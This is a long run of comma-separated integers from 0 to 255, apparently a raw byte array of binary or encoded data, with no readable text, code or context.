68,107,250,235,240,183,92,31,26,75,128,75,28,89,94,80,95,250,244,162,229,168,53,226,237,239,14,26,2,79,6,221,16,95,69,74,77,138,170,227,254,62,108,122,118,50,109,70,10,45,44,7,223,193,214,79,92,35,56,133,234,43,39,113,48,39,175,192,119,16,104,26,196,140,207,13,45,155,112,154,38,251,32,101,123,43,178,233,170,154,175,57,192,202,198,80,12,24,99,23,215,252,167,250,94,51,255,242,249,165,27,19,79,227,140,11,82,73,5,86,8,233,248,237,76,234,123,225,164,244,88,70,24,47,17,131,90,77,79,28,77,132,170,241,44,33,35,49,37,46,104,92,13,86,36,157,130,241,149,81,82,35,61,195,97,96,39,27,53,112,178,153,119,78,104,208,198,206,152,30,61,198,108,138,40,228,108,99,48,39,178,171,241,219,172,244,144,195,223,7,20,95,33,13,149,164,234,189,16,103,226,188,236,237,6,26,28,181,208,26,82,27,104,65,29,177,68,250,72,186,32,145,244,234,73,27,14,46,4,131,65,77,17,17,94,145,129,156,102,36,45,48,61,46,125,92,77,118,36,155,159,134,145,79,27,35,144,216,125,43,124,121,39,34,182,154,123,38,63,218,204,142,129,76,105,210,42,148,230,230,98,123,104,63,230,255,180,167,252,244,134,145,217,0,17,103,119,13,18,164,182,190,126,107,225,169,249,170,8,41,90,229,206,48,94,80,5,91,139,251,78,177,15,189,49,225,229,235,93,62,64,36,74,128,65,77,29,73,158,212,128,170,97,34,62,116,123,62,111,108,81,61,52,205,214,151,153,8,92,48,155,132,124,99,32,112,49,85,173,235,119,48,111,201,140,218,213,78,38,134,149,212,235,163,112,47,48,122,190,164,182,225,236,236,143,195,206,74,95,10,31,11,18,190,181,185,94,105,187,166,249,51,74,96,65,157,208,69,78,76,17,10,225,187,21,230,18,177,119,189,229,110,93,114,10,42,30,148,82,77,12,83,219,148,209,250,103,80,60,113,58,103,52,120,75,48,100,208,209,214,219,8,199,58,150,211,48,49,42,121,116,171,183,181,126,114,60,197,254,148,133,87,75,155,138,128,237,161,48,8,58,39,190,190,168,187,182,253,222,207,134,64,79,94,1,22,14,186,220,160,93,105,255,175,237,47,71,74,14,229,208,31,88,13,69,18,210,225,50,176,83,185,118,247,252,112,27,120,77,46,8,199,64,80,28,64,193,147,152,134,116,62,45,122,63,114,63,107,23,112,52,234,157,214,62,8,154,35,191,207,104,125,125,117,58,187,255,176,59,114,51,220,221,150,65,23,86,138,231,148,187,164,112,127,102,226,190,163,252,255,173,253,200,205,27,30,27,9,19,80,74,205,171,174,21,176,250,230,235,105,80,65,65,178,206,68,66,11,95,74,202,240,64,235,31,32,32,238,181,54,0,118,77,61,26,133,38,2,95,93,155,140,209,177,2,50,33,59,85,20,37,120,4,42,60,134,143,157,40,5,221,45,155,151,66,58,42,219,101,231,234,185,119,114,111,201,185,151,103,13,91,222,153,128,177,224,112,5,102,150,162,179,253,214,190,183,223,203,84,3,21,81,90,30,93,187,235,28,15,230,225,253,171,105,4,74,2,163,26,71,26,89,15,30,158,253,3,92,119,97,53,140,237,49,26,111,2,41,155,130,26,4,68,23,129,137,152,243,38,54,111,59,33,2,47,55,6,118,233,205,149,156,26,78,150,49,217,222,120,33,96,223,115,166,242,176,121,114,172,217,187,144,11,12,25,218,193,174,253,0,48,17,123,160,230,191,219,179,183,169,237,219,22,27,3,0,19,81,77,12,236,12,94,253,227,172,235,46,4,74,113,163,72,23,86,89,17,98,141,241,68,82,25,63,48,247,143,42,81,39,33,43,198,221,16,69,68,75,155,140,148,43,59,46,73,124,61,114,125,116,39,126,179,159,139,226,114,8,193,9,205,84,123,113,103,196,52,241,190,185,101,48,177,218,190,214,91,92,23,210,223,82,254,88,43,29,127,252,240,173,177,244,179,169,160,207,68,95,13,104,65,16,79,72,163,26,85,169,171,252,249,49,119,65,38,181,68,90,66,11,98,1,146,139,91,65,85,46,92,226,227,104,117,57,106,42,133,140,82,4,28,66,155,149,148,32,122,34,59,123,103,106,117,58,33,1,239,144,243,147,124,21,219,140,158,98,97,47,44,206,41,165,241,175,117,114,233,133,183,208,4,89,10,206,197,10,161,5,98,73,104,189,165,255,161,225,187,156,232,219,93,18,13,16,0,92,31,84,175,16,15,188,229,167,35,47,54,10,92,227,90,71,8,72,15,131,146,219,66,29,79,46,57,226,96,118,53,81,102,52,137,134,86,29,81,218,129,155,136,122,102,48,117,112,33,99,101,107,49,108,189,238,204,164,116,220,135,192,217,15,96,111,103,215,49,160,166,173,103,42,166,199,255,130,75,70,13,163,205,28,165,89,32,73,42,172,179,165,248,161,235,169,232,195,76,28,30,65,27,74,85,57,163,6,20,253,251,238,62,101,52,87,55,146,65,10,12,122,69,154,214,145,15,70,76,103,97,160,39,102,42,47,96,52,133,148,75,110,55,128,199,141,221,32,100,52,58,112,246,98,126,108,125,49,189,205,198,252,36,200,249,194,202,29,33,99,125,193,252,241,166,181,126,114,177,219,229,208,6,86,86,219,132,79,238,3,98,29,240,253,246,217,231,235,224,130,248,203,53,99,30,16,91,45,85,73,179,77,14,228,239,153,33,44,56,22,62,228,90,79,22,50,17,210,151,145,87,0,9,101,158,241,115,106,121,84,102,101,129,100,66,109,90,216,146,204,152,113,58,49,192,59,173,122,47,107,101,14,242,154,147,178,112,200,199,140,129,11,23,123,22,199,164,189,174,185,110,42,183,155,165,73,11,76,17,150,223,71,251,23,3,15,241,244,181,184,168,186,190,164,170,64,77,90,30,0,0,82,20,88,225,86,143,232,239,231,115,53,43,3,62,117,12,79,70,50,21,193,223,129,15,21,49,38,141,226,60,102,113,55,24,116,159,119,11,63,7,212,132,141,218,32,202,48,153,122,184,98,47,44,49,119,248,184,193,246,106,222,129,139,203,90,16,106,11,158,187,230,226,237,127,32,188,182,190,31,3,29,51,144,153,80,165,3,2,126,248,252,177,232,185,224,224,181,248,93,84,71,29,26,112,82,31,17,75,86,140,232,239,238,77,53,121,63,119,109,6,85,28,37,16,247,158,219,86,67,49,97,207,160,53,119,56,36,106,178,129,98,91,52,16,212,146,158,70,61,195,48,140,97,246,22,109,106,123,178,229,219,150,219,104,144,211,206,208,82,107,44,11,217,166,225,174,171,110,188,183,188,245,27,64,29,13,209,175,27,89,14,6,21,153,229,162,228,251,97,182,229,241,6,84,125,1,90,81,71,1,64,1,79,223,250,161,172,102,43,48,36,112,105,16,1,12,52,29,193,156,213,21,27,35,71,132,182,115,109,112,101,106,178,207,110,84,51,90,212,144,132,74,125,218,96,216,56,210,101,101,123,107,251,179,184,154,190,105,172,145,220,80,14,87,113,30,197,233,167,132,14,107,161,183,245,190,27,19,14,80,154,67,76,11,82,27,21,251,244,162,190,166,57,252,225,172,73,84,87,1,26,216,91,103,75,28,94,223,232,161,248,50,104,52,59,102,125,89,67,71,50,154,147,142,143,73,30,110,58,213,241,127,8,43,101,58,174,137,100,81,113,72,140,138,223,22,123,197,55,128,103,246,43,126,48,115,234,244,234,143,190,62,196,195,220,4,29,91,23,124,158,168,236,185,94,46,171,237,170,248,92,19,28,249,144,90,10,58,27,115,12,251,236,235,77,234,55,160,140,177,44,84,2,116,29,204,91,93,74,17,78,212,225,241,127,123,58,113,51,102,52,72,105,92,104,218,199,150,149,9,71,35,58,214,13,99,33,59,41,43,169,155,110,80,56,128,198,218,158,13,59,210,52,140,224,251,0,116,60,60,178,168,171,193,175,180,220,208,150,30,81,17,33,13,199,186,251,236,15,46,255,232,235,183,27,10,65,229,164,1,17,27,14,18,9,251,79,174,18,225,88,166,175,241,11,57,22,46,73,134,16,67,86,17,26,212,143,161,109,62,102,33,127,108,28,68,74,103,41,220,220,241,144,85,0,35,208,131,122,101,127,107,51,119,241,159,35,61,107,217,155,148,159,23,38,210,34,212,161,184,98,122,104,32,247,242,180,254,246,154,222,151,206,30,29,20,59,93,56,231,177,236,72,37,227,238,245,52,30,17,36,254,194,83,94,27,5,93,138,249,21,162,75,225,57,228,254,229,0,37,17,127,1,140,90,4,78,17,129,157,209,151,21,60,62,32,51,124,50,28,23,112,36,156,185,192,139,71,135,113,155,155,33,106,58,106,52,50,183,246,100,107,104,129,155,196,207,87,126,192,159,212,160,252,45,124,9,58,246,181,176,241,166,245,154,195,156,116,9,20,3,18,15,166,251,231,8,103,243,173,236,51,29,91,31,247,194,83,80,76,15,7,158,229,94,170,74,235,42,190,158,38,71,126,26,51,27,148,0,91,94,27,222,252,140,175,116,32,62,52,61,100,47,109,0,49,53,152,130,134,153,78,154,97,202,142,39,43,103,121,54,166,202,176,63,19,41,192,212,130,155,16,75,222,153,139,205,164,98,125,104,248,240,189,169,186,178,241,138,129,206,11,3,90,65,15,85,166,163,174,94,40,225,188,237,61,27,81,23,190,164,83,94,1,30,64,198,171,27,182,9,250,42,226,249,60,29,121,11,42,90,240,92,92,1,95,146,149,129,243,116,102,98,48,59,61,111,42,85,49,95,199,129,142,108,19,218,47,140,213,104,49,120,197,39,187,251,174,119,39,24,197,194,214,65,92,21,196,195,204,214,162,58,101,127,253,162,161,174,189,172,239,200,207,6,92,114,13,86,18,93,202,163,188,72,176,235,226,247,117,21,74,6,224,81,64,66,22,21,6,134,240,78,231,79,122,45,160,191,106,29,100,2,43,26,156,0,2,89,91,146,207,223,227,116,112,63,36,113,96,27,96,90,126,126,157,146,193,111,75,211,58,139,151,10,39,60,222,50,162,230,169,106,13,113,199,164,218,19,76,92,222,195,208,235,246,45,88,100,227,170,180,161,252,173,245,240,140,77,80,95,24,19,120,76,231,170,94,15,142,231,186,238,115,90,17,28,224,92,95,92,26,7,91,140,233,64,29,27,46,49,131,254,126,7,55,89,49,155,133,81,25,64,70,247,197,255,112,54,54,35,122,124,96,113,116,39,57,177,132,144,204,106,75,211,35,213,222,48,55,96,133,127,179,252,177,119,114,188,128,160,145,90,30,9,128,205,203,161,117,108,95,122,236,165,239,240,179,178,191,155,140,53,83,94,50,19,8,9,80,177,19,94,166,251,167,233,47,31,21,62,225,89,28,11,85,19,80,198,193,24,64,78,108,88,167,170,49,71,117,86,127,200,128,78,31,91,17,219,212,202,120,98,109,120,105,58,32,125,55,49,126,201,208,215,156,109,73,157,59,202,84,96,117,98,207,63,162,172,254,111,100,177,157,183,140,27,12,12,151,197,71,184,85,113,21,120,244,162,191,177,245,254,169,248,209,67,1,85,9,114,65,84,23,225,87,28,161,177,249,245,101,119,87,43,228,92,1,92,28,7,5,141,205,89,82,19,46,46,129,253,114,33,117,116,46,202,148,75,89,1,65,129,233,136,59,122,34,63,59,37,96,127,105,123,114,174,255,194,134,62,19,196,137,207,17,11,117,110,145,52,186,183,251,53,61,240,135,254,154,81,90,23,209,152,12,187,104,106,12,104,186,251,181,161,225,250,229,232,222,26,91,5,71,90,92,81,62,247,6,83,167,188,182,39,114,32,10,102,239,7,27,28,85,7,135,146,140,30,10,31,60,57,165,49,108,119,37,33,61,206,135,66,95,90,195,158,129,144,105,116,107,37,2,63,48,97,44,18,44,170,220,131,134,107,218,198,189,155,123,102,118,102,222,58,247,233,177,37,114,234,134,183,142,90,71,51,154,216,28,224,23,58,14,100,248,162,161,186,225,230,177,185,129,69,4,89,74,1,6,93,31,181,77,15,225,239,248,106,116,18,91,62,231,72,28,70,42,69,203,138,145,18,82,84,118,212,236,39,119,121,59,32,51,135,148,80,117,70,216,129,159,144,105,116,96,60,97,225,100,58,107,39,108,244,136,139,172,107,156,223,194,138,21,42,99,122,158,168,170,189,225,113,16,247,218,183,155,0,25,16,177,143,23,187,91,45,15,160,248,162,186,235,253,230,165,238,151,90,10,85,27,90,6,83,88,183,87,148,139,241,161,32,114,56,17,55,238,93,84,86,110,31,155,215,149,67,64,76,34,132,171,127,42,113,101,112,113,144,101,26,111,65,129,128,141,152,127,102,122,202,59,166,122,53,120,115,106,175,221,150,252,109,170,192,135,141,55,41,42,81,131,187,238,250,225,103,97,237,145,175,64,4,27,21,150,193,87,169,79,30,21,229,236,183,173,240,171,224,245,241,73,68,82,31,8,93,68,31,22,236,82,143,228,156,253,59,114,92,13,54,116,80,2,66,46,7,193,140,128,91,0,123,60,213,173,115,42,104,120,42,173,137,62,76,113,70,196,219,141,148,38,177,109,154,62,236,123,126,116,105,126,168,250,138,167,41,144,145,220,156,21,11,44,87,195,177,250,174,181,60,59,236,171,245,65,75,28,105,208,212,23,24,88,27,12,195,229,171,161,168,246,251,252,244,6,7,14,31,109,81,16,79,88,67,86,157,251,173,247,38,61,42,34,62,100,7,12,78,46,11,147,198,143,94,0,50,103,189,246,101,104,121,57,32,190,209,93,0,125,90,181,198,213,6,38,210,48,192,73,186,59,63,108,48,160,244,169,198,190,112,172,221,214,3,13,13,55,8,131,206,186,174,170,105,243,240,234,229,8,1,65,13,202,158,82,80,2,10,122,251,231,174,239,176,49,228,228,237,5,93,2,13,8,26,27,15,76,90,80,201,250,175,188,59,99,54,38,54,110,64,86,88,36,7,135,230,138,73,90,54,103,246,250,100,55,83,47,125,190,198,119,13,104,45,157,205,235,13,103,220,34,145,57,165,96,117,58,49,178,180,184,209,236,112,226,211,129,56,126,24,116,91,128,205,186,188,12,105,163,177,249,183,92,26,76,8,211,26,87,74,82,4,9,136,160,240,15,178,53,254,162,244,73,48,100,67,92,133,6,15,39,44,77,147,167,246,224,38,58,32,97,113,52,10,91,92,45,199,154,156,203,37,69,35,72,132,246,122,124,117,52,102,178,137,106,0,110,155,128,145,213,86,49,199,52,187,63,161,32,126,60,38,178,180,253,143,174,117,198,155,192,92,69,9,109,76,199,234,173,232,20,51,167,254,240,248,6,90,92,255,209,83,75,89,25,80,8,233,183,172,57,168,33,254,237,172,29,21,75,94,92,245,92,85,58,95,94,142,224,177,125,42,37,48,51,38,46,68,1,60,114,156,130,128,136,1,26,103,38,155,61,127,119,48,39,96,234,135,102,22,47,219,134,192,141,23,127,157,46,193,167,241,122,47,11,110,178,206,250,148,169,180,222,219,194,4,83,11,112,12,31,164,173,188,90,117,161,246,211,183,90,16,0,251,194,53,73,89,0,26,10,173,69,246,5,186,40,166,175,177,92,99,96,101,4,152,82,95,88,74,87,223,128,234,49,43,53,113,32,113,125,72,89,105,114,218,139,234,219,6,30,42,141,158,56,39,118,83,55,43,252,209,53,97,106,145,212,130,133,74,124,193,222,138,230,161,54,117,104,123,225,171,160,179,166,236,154,139,140,30,73,16,111,92,93,234,176,167,11,107,253,234,171,105,106,81,28,247,150,83,94,72,69,115,151,166,87,181,79,160,57,176,191,42,90,120,75,120,65,214,10,77,28,17,158,138,129,162,98,34,61,119,107,45,125,49,79,44,126,220,159,142,223,75,223,117,203,134,125,115,124,105,104,38,176,161,111,98,47,227,221,139,131,30,49,129,185,143,160,251,35,127,100,12,164,239,250,210,178,165,144,211,211,10,15,11,1,76,93,168,234,246,94,119,177,172,187,51,0,15,6,247,209,7,75,24,22,0,150,177,25,177,77,161,97,235,199,44,90,117,12,45,27,192,29,15,68,7,208,212,253,239,116,34,33,122,118,107,115,54,82,118,114,153,131,204,112,86,193,42,217,158,123,97,110,121,52,161,241,171,96,38,125,182,218,144,223,4,16,194,142,192,169,163,36,109,123,228,254,173,172,170,234,175,172,209,221,70,5,74,67,92,18,204,163,250,28,103,253,166,160,91,74,3,2,229,135,71,93,73,70,6,218,167,95,176,81,225,123,176,175,126,10,114,74,46,8,140,85,94,28,11,139,197,212,245,120,58,33,111,59,42,111,42,1,102,120,154,128,142,57,78,199,113,139,216,100,125,125,196,69,218,183,185,103,123,125,220,199,204,3,87,75,218,149,156,189,184,113,14,58,182,166,204,171,241,247,224,200,138,27,28,5,9,19,16,19,252,234,236,28,255,225,246,240,46,30,3,14,184,90,48,47,81,15,4,220,166,125,240,81,118,47,174,254,104,28,118,14,61,8,192,84,77,72,64,237,139,215,227,38,96,33,97,32,60,51,32,67,108,53,129,193,157,124,87,159,102,155,222,100,111,44,219,53,171,172,171,127,97,37,219,191,218,1,87,91,192,197,216,224,188,107,95,33,248,243,239,182,161,234,241,225,233,21,4,39,1,19,52,18,234,241,12,21,176,171,252,173,61,28,65,46,175,91,66,93,75,17,27,158,233,94,92,9,108,49,135,229,109,69,62,17,51,159,156,66,77,1,7,244,147,150,97,49,122,117,112,122,114,111,120,1,104,175,144,139,204,124,71,177,50,217,55,100,107,17,177,101,252,241,183,100,114,235,208,227,138,65,76,11,173,205,204,191,4,107,98,41,236,247,188,184,165,225,239,239,138,84,91,29,74,11,12,18,88,173,23,21,251,255,238,160,52,80,13,38,254,4,95,38,13,23,30,142,145,87,94,93,105,49,226,161,112,89,117,106,46,137,134,11,65,72,28,130,223,138,14,38,99,127,60,35,114,24,106,39,114,174,155,131,154,116,82,192,97,204,79,48,119,110,199,39,247,190,237,63,114,246,139,165,202,19,92,25,193,216,23,251,0,114,124,112,237,162,173,201,167,170,253,248,214,21,28,89,2,27,75,18,54,251,28,94,161,243,173,234,45,122,74,62,190,89,121,66,24,72,220,139,143,94,27,84,103,123,234,254,112,29,99,59,43,203,130,66,3,92,65,211,129,143,120,108,122,36,32,43,98,53,111,101,109,248,208,205,142,40,75,192,206,204,79,100,106,120,196,41,191,236,176,107,48,254,139,191,216,19,80,10,206,223,28,235,116,118,15,127,237,170,226,234,231,151,253,232,143,84,124,1,26,29,21,78,17,171,94,13,248,177,224,59,127,47,15,95,228,39,91,78,101,23,129,210,153,91,28,9,34,119,241,123,112,56,37,33,46,128,135,66,31,7,199,155,141,218,50,59,53,45,124,166,122,101,111,122,118,255,155,219,204,40,219,223,221,205,4,39,117,118,197,110,250,191,169,116,61,176,145,239,151,27,28,94,141,143,77,187,23,113,17,122,182,172,255,234,253,225,229,160,151,67,17,13,0,1,23,78,0,247,74,82,176,246,246,37,46,112,76,119,247,26,95,64,104,69,219,135,153,78,82,19,62,158,242,123,60,112,47,50,42,137,140,91,109,91,220,131,217,152,33,44,34,148,122,184,53,8,61,60,114,164,218,193,230,86,154,154,140,155,11,42,46,54,217,164,166,185,175,103,17,177,145,243,65,75,28,0,218,222,72,235,5,123,17,189,224,177,254,164,189,226,175,248,202,84,77,95,90,29,82,17,74,171,6,212,224,201,247,113,116,56,87,43,184,92,10,12,40,7,133,150,216,91,29,97,62,213,238,100,42,107,59,124,105,219,97,74,113,68,155,128,132,152,43,96,118,212,59,188,6,109,61,115,118,173,217,197,230,112,129,197,154,217,29,100,44,11,149,234,250,174,185,112,96,238,238,240,75,27,91,25,131,217,79,235,4,0,126,186,253,178,188,188,167,242,239,210,92,69,40,1,92,19,92,18,12,90,76,212,186,242,172,62,37,113,15,47,63,9,17,6,40,83,147,151,153,52,25,45,32,207,182,115,44,48,111,32,183,209,100,78,111,65,254,208,158,218,101,219,49,212,105,230,42,101,105,125,161,254,209,215,235,112,129,199,206,217,69,87,59,122,197,233,179,188,185,103,61,242,238,187,30,91,90,80,215,205,86,23,23,0,15,224,252,162,185,168,170,252,229,232,90,90,31,3,0,90,31,31,11,68,6,140,248,173,253,58,46,52,58,124,24,90,79,66,110,11,147,146,137,8,0,115,54,155,187,39,42,117,53,112,183,203,37,81,107,68,221,129,159,30,101,210,54,151,36,180,114,109,55,122,230,233,170,143,190,116,193,193,135,10,15,24,114,76,194,201,160,166,170,117,230,188,234,162,6,1,23,11,150,95,78,24,115,70,9,224,237,162,227,186,119,224,227,183,45,55,22,25,8,29,64,1,75,71,75,145,225,227,170,106,127,54,122,45,125,16,33,30,60,72,199,214,149,5,64,35,97,207,235,33,60,119,117,32,250,204,19,74,37,10,194,147,154,22,127,193,52,154,40,158,122,40,102,49,178,242,184,224,183,61,223,213,216,5,126,90,111,81,207,186,252,166,28,113,166,246,247,166,8,86,23,92,194,95,82,16,14,18,95,251,189,171,75,225,70,189,175,237,12,22,90,79,71,132,71,2,88,121,28,139,160,239,101,96,33,106,51,44,105,16,34,42,117,218,218,159,151,78,2,113,46,131,182,97,47,96,47,58,190,155,121,66,46,139,155,139,133,124,123,197,122,216,38,184,112,122,123,60,166,179,170,155,168,239,156,129,135,18,9,24,59,12,195,231,241,162,1,53,188,177,234,183,92,1,71,163,208,83,80,13,23,18,17,252,5,174,74,231,42,224,227,183,73,90,90,47,71,148,10,77,73,65,12,142,232,183,99,33,36,45,51,106,100,65,82,44,53,136,157,157,203,71,71,49,59,153,38,127,96,121,55,32,241,204,110,61,62,219,197,130,133,14,105,139,113,209,235,189,45,127,36,12,240,219,184,143,182,241,192,155,150,18,13,13,99,16,78,130,181,246,54,46,149,254,249,227,24,74,65,251,204,23,23,16,1,73,137,229,68,171,19,160,32,224,164,244,71,112,22,105,74,154,92,15,48,28,23,254,148,161,96,102,33,56,42,47,117,58,91,44,88,202,220,218,151,71,6,49,217,153,48,97,119,113,127,124,190,137,119,103,110,219,220,195,132,76,125,203,143,206,169,166,32,47,33,127,251,177,236,225,169,169,129,195,194,18,105,1,29,6,18,191,179,246,83,117,251,254,234,46,25,3,71,229,131,64,94,89,7,74,134,177,69,176,45,250,118,242,185,60,80,39,16,61,1,138,68,25,84,67,155,147,142,183,55,59,36,106,127,32,100,58,90,118,60,136,154,135,140,19,219,108,213,132,60,39,120,110,39,59,190,171,99,17,113,201,155,227,194,70,10,157,205,154,176,253,110,57,127,127,251,185,236,252,247,130,144,141,206,18,90,24,19,22,73,240,182,183,94,113,161,253,237,32,65,27,14,254,218,90,73,85,69,93,146,229,49,176,93,168,106,182,191,112,27,114,2,51,71,134,67,92,10,64,146,148,254,241,54,39,103,45,61,61,111,49,10,49,126,134,221,204,106,71,156,106,217,131,123,115,110,106,47,171,234,246,123,103,113,209,150,130,81,11,14,210,231,145,188,213,112,34,100,172,188,185,250,191,178,241,156,162,217,118,30,20,65,10,15,176,229,160,28,170,253,250,239,49,79,26,71,226,210,90,93,85,7,27,208,233,87,227,77,160,93,171,237,44,8,39,118,46,90,214,0,31,13,90,146,136,129,172,96,125,59,59,61,107,125,105,12,126,60,192,143,204,40,5,211,62,141,151,33,115,60,222,117,250,166,254,119,103,30,153,220,214,29,92,16,219,140,203,253,231,117,12,48,250,187,255,173,165,182,253,217,155,6,30,3,13,65,70,75,252,229,77,20,228,227,182,240,61,8,26,14,238,70,64,86,64,21,5,143,233,27,187,59,38,45,164,248,126,64,55,86,61,159,192,84,65,95,91,132,148,192,245,102,109,52,48,51,16,24,52,91,44,100,205,138,199,62,9,211,53,208,213,96,119,44,132,62,179,190,173,121,106,115,222,245,214,7,90,80,220,205,204,191,5,98,17,102,149,178,161,170,186,190,191,234,129,93,5,5,125,31,14,9,240,225,10,12,228,229,188,187,49,71,15,46,185,28,69,89,11,7,7,158,248,69,82,74,103,41,160,185,44,42,55,112,101,152,209,82,92,72,26,154,157,129,61,54,42,33,60,37,61,125,120,17,57,229,199,194,134,57,9,211,47,188,13,100,55,124,152,127,187,168,245,127,101,254,209,183,227,81,93,25,210,205,202,167,23,116,14,58,224,171,238,171,161,254,238,188,213,50,91,5,76,65,74,85,78,175,86,68,225,243,238,188,53,33,3,44,163,72,50,94,89,19,18,141,129,68,70,15,118,57,240,237,126,91,38,62,49,156,133,11,89,89,83,209,133,152,101,97,34,111,122,34,114,47,113,127,107,180,128,144,193,124,29,168,215,203,69,14,42,127,215,46,235,251,177,107,102,166,221,191,138,29,125,85,144,197,76,167,27,4,29,122,244,164,210,160,162,160,178,246,209,27,7,26,64,65,70,85,25,179,16,99,241,163,186,176,40,121,3,124,181,72,26,27,27,78,133,151,213,5,22,84,118,48,160,225,38,104,36,106,122,163,206,11,77,16,220,198,149,209,42,53,52,53,60,25,48,63,58,101,1,175,220,204,142,124,14,223,220,207,19,96,34,98,197,127,161,246,170,116,32,254,218,244,205,19,92,80,144,197,73,241,27,113,29,49,161,174,228,130,163,181,175,240,208,70,18,85,31,31,64,18,0,163,10,78,138,224,182,123,105,32,64,62,149,72,70,7,100,22,130,218,205,30,92,15,46,43,160,63,38,121,42,50,61,129,148,78,68,7,212,240,152,139,38,122,69,60,33,251,59,34,58,43,114,175,154,144,153,110,223,192,220,139,10,44,6,39,197,240,179,166,176,119,59,246,217,229,227,0,36,13,144,132,23,165,85,58,88,97,230,180,226,168,235,176,235,240,141,6,16,39,28,95,66,84,78,163,6,15,225,227,182,62,47,47,3,62,247,72,81,71,42,84,155,220,153,69,91,20,61,129,241,58,112,107,86,62,42,234,214,80,116,68,155,133,242,212,12,116,102,202,32,173,23,97,113,39,126,189,193,131,204,110,200,198,171,139,15,10,118,124,217,251,208,162,237,47,61,136,197,164,6,26,75,10,145,197,23,169,85,113,17,187,250,174,245,230,213,227,244,177,91,84,90,25,80,19,82,8,26,230,82,157,228,161,188,38,40,43,87,54,230,7,75,64,44,21,130,158,193,87,16,106,56,159,148,115,58,43,33,124,127,145,123,80,107,1,198,134,141,150,105,157,48,207,40,236,97,109,42,115,107,255,176,204,183,40,129,221,220,202,29,122,42,6,192,166,225,235,240,63,114,254,176,209,0,19,31,8,128,223,78,160,113,2,84,138,244,180,245,225,242,229,235,172,73,28,27,1,8,1,82,79,78,7,75,196,170,237,238,37,114,32,11,106,125,92,75,92,93,83,221,136,144,14,82,49,54,195,169,61,44,106,117,39,234,144,100,26,113,89,150,211,152,137,123,138,8,148,97,184,103,127,120,96,187,172,224,247,190,124,138,176,139,207,9,74,42,81,222,160,160,188,235,103,253,233,141,242,26,81,14,91,154,137,72,24,25,5,17,224,231,238,255,168,191,251,248,235,29,22,67,4,90,19,92,68,31,11,29,143,241,245,145,102,42,113,51,55,46,7,78,92,53,73,147,204,149,21,90,108,62,128,160,115,49,43,43,34,190,155,35,76,113,95,216,192,204,30,38,192,107,172,106,180,99,30,97,115,251,239,180,138,190,116,138,194,129,93,13,90,113,6,215,188,242,187,245,46,225,157,249,190,30,90,71,15,128,69,116,26,61,18,14,250,166,162,161,250,57,251,227,248,17,43,99,78,92,192,0,91,39,26,79,233,251,172,238,62,73,43,42,43,106,7,75,12,95,20,132,128,151,75,65,35,57,151,157,107,118,113,100,32,182,219,123,66,125,80,221,146,154,74,113,220,107,206,40,180,48,120,102,97,188,174,236,149,245,114,138,212,156,66,17,20,99,8,215,188,241,174,120,105,186,247,176,164,8,65,70,239,194,90,28,65,23,91,95,255,248,172,5,252,40,187,162,153,69,88,10,108,1,221,16,41,77,28,17,148,172,241,102,125,127,56,51,48,63,64,67,93,126,132,132,218,251,71,23,54,57,151,100,49,47,44,46,62,202,133,35,32,62,145,150,208,149,81,103,210,49,192,103,163,45,123,124,49,171,175,173,203,190,235,144,145,156,74,95,10,99,30,133,188,224,184,94,49,166,247,234,183,95,0,27,247,209,7,86,89,7,27,73,186,15,162,43,185,47,170,162,135,6,0,2,126,92,157,94,77,26,83,28,143,142,227,11,33,59,108,69,106,113,80,23,42,126,132,154,128,221,82,75,123,124,132,97,103,96,97,41,32,171,137,123,32,30,209,212,225,133,10,43,210,109,140,169,165,110,44,124,54,178,239,244,161,173,241,155,215,219,90,8,89,99,8,9,176,225,166,120,51,159,188,233,185,90,17,65,231,203,6,12,65,23,87,204,251,64,224,79,187,118,239,168,186,89,85,80,46,0,148,70,31,76,83,87,149,209,235,125,106,45,108,51,50,115,55,75,50,115,153,223,128,209,73,94,112,186,155,112,103,10,96,102,33,182,235,52,114,116,193,212,130,132,11,38,222,219,203,188,173,54,35,104,60,160,189,174,161,178,228,154,151,135,11,29,11,81,23,78,198,235,189,16,51,186,172,245,91,79,18,86,146,202,95,28,29,22,80,137,231,68,237,75,164,53,242,191,114,69,36,90,116,4,148,70,3,12,17,208,147,144,235,98,112,61,117,51,48,52,104,80,55,126,136,199,158,138,79,211,45,155,129,124,99,44,32,39,96,230,173,47,114,111,201,212,199,154,74,75,192,137,214,161,167,54,109,60,102,229,173,168,163,241,188,196,195,140,74,79,1,103,15,31,168,163,207,83,105,225,253,187,114,8,15,92,247,204,26,94,11,18,7,209,171,91,171,15,237,118,241,250,44,65,85,19,42,1,148,29,88,89,91,139,216,231,227,116,32,45,32,37,61,41,42,77,118,36,158,147,204,109,81,145,49,139,135,60,127,39,117,52,170,234,185,101,114,110,135,193,130,0,23,86,144,196,202,169,246,35,47,48,244,230,186,161,164,236,238,156,160,134,0,20,22,0,87,93,168,163,185,16,176,186,196,173,61,80,15,109,251,143,26,43,65,85,28,208,251,87,180,79,61,57,176,162,109,6,124,76,51,92,135,22,85,70,68,134,223,138,240,125,50,111,122,124,124,110,96,84,60,60,134,193,142,124,85,194,43,217,142,44,55,122,133,127,187,246,240,3,114,52,136,239,142,29,18,91,134,149,151,230,241,113,15,39,229,240,245,174,179,190,178,209,138,51,30,29,81,90,92,14,225,163,28,4,230,234,248,245,101,27,11,30,229,72,95,66,81,7,80,220,189,87,176,31,124,109,176,228,100,71,55,10,44,155,157,23,15,72,65,134,207,136,250,116,53,37,106,103,38,50,120,79,55,244,156,219,199,62,71,218,65,141,155,96,38,98,253,53,161,173,223,53,101,62,218,245,140,71,23,14,202,222,216,253,27,46,121,33,244,234,173,203,179,219,245,224,209,12,3,95,90,6,23,68,74,183,10,5,170,255,252,247,51,8,10,54,249,68,64,92,81,73,18,144,253,94,94,74,107,48,167,251,55,73,55,34,37,221,152,90,8,88,17,223,145,209,116,103,52,117,74,32,97,125,106,75,102,189,132,138,154,101,38,181,123,192,84,112,99,123,155,110,163,230,168,56,102,177,145,164,142,19,16,124,202,196,87,230,5,45,11,23,244,254,161,172,250,190,235,171,203,92,80,21,10,7,6,31,75,247,82,95,175,161,172,249,49,42,11,40,254,89,65,86,0,7,70,198,140,30,64,85,118,57,242,251,61,48,120,62,45,157,133,11,25,28,35,219,213,204,127,120,107,117,40,51,38,47,109,123,111,151,154,131,130,117,71,211,194,139,17,127,49,110,153,48,208,175,176,40,102,177,219,239,192,2,76,25,138,193,12,188,113,43,29,104,151,160,165,161,163,183,241,180,202,6,0,25,10,75,23,79,26,176,17,72,176,188,251,39,45,113,13,50,191,0,26,92,65,72,147,209,151,49,10,79,124,53,176,191,102,59,59,38,104,199,214,86,77,90,216,146,217,138,115,61,67,58,40,85,96,63,58,58,38,175,234,194,158,53,196,